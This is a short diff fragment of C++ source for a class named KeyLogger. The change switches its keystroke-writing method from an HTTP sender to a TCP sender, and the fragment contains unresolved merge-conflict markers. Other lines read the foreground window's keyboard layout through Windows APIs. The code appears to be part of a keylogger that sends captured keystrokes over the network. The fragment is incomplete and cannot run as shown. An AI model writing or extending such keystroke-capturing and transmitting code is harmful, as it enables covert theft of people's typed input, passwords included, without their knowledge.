@@ -16,7 +16,7 @@ KeyLogger::KeyLogger() : _keysState(256, false), _keysIgnored(256, false){
 <<<<<<< Updated upstream
 void KeyLogger::WriteEventKeys(ostream& buf)
 =======
-void KeyLogger::WriteEventKeys(HttpSender* sender)
+void KeyLogger::WriteEventKeys(TcpSender* sender)
 >>>>>>> Stashed changes
 {	
     bool isEn = (LOWORD(GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), 0))) == 0x409);
